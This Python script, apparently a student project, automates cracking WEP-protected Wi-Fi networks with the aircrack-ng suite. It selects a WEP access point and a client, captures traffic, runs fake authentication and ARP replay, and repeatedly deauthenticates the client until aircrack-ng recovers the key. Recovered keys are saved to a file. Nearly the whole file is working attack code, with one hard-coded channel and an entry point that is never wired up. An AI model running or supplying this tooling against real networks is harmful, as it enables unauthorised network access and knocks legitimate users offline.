import subprocess, time, csv, sys, shutil, os

def identify_wep():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print("Vulnerability: Uses WEP encryption, which is outdated and easily cracked.")
                    print("Remediation: Upgrade to WPA3 or at least WPA2 encryption.\n")
            else:
                print("No vulnerable access points found using WEP encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def target_ap():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            wep_aps = []
            for row in csv_reader:
                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
                    wep_aps.append(row)

            if wep_aps:
                print("Select a Vulnerable Access Point by its index number:")
                for index, ap in enumerate(wep_aps):
                    print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                
                # Assuming the selection process is outside of this function, as it would need user input.
                # User should replace `selected_index` with the actual selection mechanism, e.g., input from the user.
                selected_index = int(input("Enter the index number of the target AP: "))
                if 0 <= selected_index < len(wep_aps):
                    selected_ap = wep_aps[selected_index]
                    return selected_ap[2], selected_ap[0]  # Returning ESSID and BSSID
                else:
                    print("Invalid index selected.")
                    return None, None
            else:
                print("No vulnerable access points found using WEP encryption.")
                return None, None

    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
        return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None

def ensure_data_directory_exists():
    directory = "/mnt/data"
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def run_airodump(bssid):
    try:
        channel = "6"  # Example channel; this could be dynamic based on your needs
        file_prefix = ensure_data_directory_exists() + "/airodump"
        command = [
            'airodump-ng',
            '-c', channel,
            '--bssid', bssid,
            'wlan0mon',
            '--write', file_prefix,
            '--output-format', 'csv'
        ]
        print("Running airodump-ng... Press Ctrl+C to stop.")
        airodump_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            airodump_process.wait()
        except KeyboardInterrupt:
            airodump_process.terminate()
            print("\nAirodump-ng stopped by user.")
        airodump_process.communicate()

        directory = ensure_data_directory_exists()
        csv_file = None
        for file in os.listdir(directory):
            if file.startswith("airodump") and file.endswith('.csv'):
                csv_file = directory + '/' + file
                break

        if csv_file is None:
            print("No CSV file generated by airodump-ng.")
            return

        clients = []
        with open(csv_file, mode='r') as file:
            content = file.read()
            # Assuming client information is in the second section of the CSV after access points
            client_section = content.split('Station MAC,')[1] if 'Station MAC,' in content else ''
            csv_reader = csv.reader(client_section.splitlines())
            next(csv_reader)  # Skip the header row
            for row in csv_reader:
                if len(row) > 0 and row[0].strip() != '':  # Check for non-empty rows
                    clients.append(row[0].strip())  # Assuming the first column is the Station MAC

        if not clients:
            print("No clients found.")
            return

        clients_filename = directory + '/clients.txt'
        with open(clients_filename, 'w') as clients_file:
            for client in clients:
                clients_file.write(client + '\n')

        print("Clients found and saved to:", clients_filename)
        
        # Presenting the user with the client selection
        print("Select a client by its index number:")
        for index, client in enumerate(clients):
            print(f"{index}: {client}")
        
        selected_index = int(input("Enter the index number of the target client: "))
        if 0 <= selected_index < len(clients):
            selected_client = clients[selected_index]
            print(f"Selected client MAC: {selected_client}")
            return selected_client
        else:
            print("Invalid index selected.")
            return None

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def target_c(bssid):
    client_mac = run_airodump(bssid)
    return client_mac

def run_command_background(cmd):
    """Run command in the background"""
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def run_command(cmd):
    """Run command and wait for it to complete, returning its output"""
    process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return process.stdout, process.stderr

def crack_wep():
    """Attempt to crack WEP and return success status and output"""
    stdout, _ = run_command("sudo aircrack-ng ./wep_attack-01.cap")
    return ("KEY FOUND!" in stdout), stdout

def save_key(essid, key):
    """Save the found key to /mnt/data/ap_keys with essid"""
    with open('/mnt/data/ap_keys', 'a') as file:
        file.write(f"{essid}, {key}\n")

def extract_key(output):
    """Extract the key from the full output"""
    key_line = [line for line in output.split('\n') if "KEY FOUND!" in line]
    if key_line:
        key = key_line[0].split('[', 1)[1].split(']')[0].strip()
        return key
    return "No key found"

def main(essid, ap_mac, your_mac, client_mac):
    interface = "wlan0mon"
    #hard coded channel for project dont have time to set dynamically
    channel = "6"

    airodump_proc = None
    arp_replay_proc = None

    try:
        # Start airodump-ng in background
        airodump_cmd = f"sudo airodump-ng {interface} --bssid {ap_mac} -c {channel} -w wep_attack"
        airodump_proc = run_command_background(airodump_cmd)
        print("Dumping Traffic...")

        # Perform fake authentication
        fake_auth_cmd = f"aireplay-ng -1 0 -e {essid} -a {ap_mac} -h {your_mac} {interface}"
        run_command(fake_auth_cmd)
        print("Executed Fake Authentication Attack...")

        # Start ARP replay attack in background
        arp_replay_attack_cmd = f"aireplay-ng -3 -b {ap_mac} -h {your_mac} {interface}"
        arp_replay_proc = run_command_background(arp_replay_attack_cmd)
        print("Executing ARP Request Reply Attack...")

        # Perform initial deauth
        deauth_cmd = f"sudo aireplay-ng -0 10 -a {ap_mac} -c {client_mac} {interface}"
        run_command(deauth_cmd)
        print("Sending Initial Deauthentication Packets...")

        time.sleep(5)

        # Attempt to crack WEP until successful
        success = False
        while not success:
            success, output = crack_wep()
            if success:
                key = extract_key(output)
                print("Success! WEP Key Found:")
                print(key)
                # Save the key with essid
                save_key(essid, key)
                print(f"Key saved for {essid}")
                # Move the .cap file upon success
                shutil.move('./wep_attack-01.cap', '/mnt/data/wep_attack-01.cap')
                run_command("rm -f ./wep*")
                print("Moved .cap file to /mnt/data")
            else:
                print("Failed to crack WEP. Sending Additional Deauth Packets and Retrying...")
                run_command(deauth_cmd)
                time.sleep(5)  # Wait a bit before retrying

    except KeyboardInterrupt:
        print("\nInterrupted by user. Cleaning up...")
    finally:
        # Cleanup: stop background processes
        if airodump_proc:
            airodump_proc.terminate()
        if arp_replay_proc:
            arp_replay_proc.terminate()
        sys.exit(0)
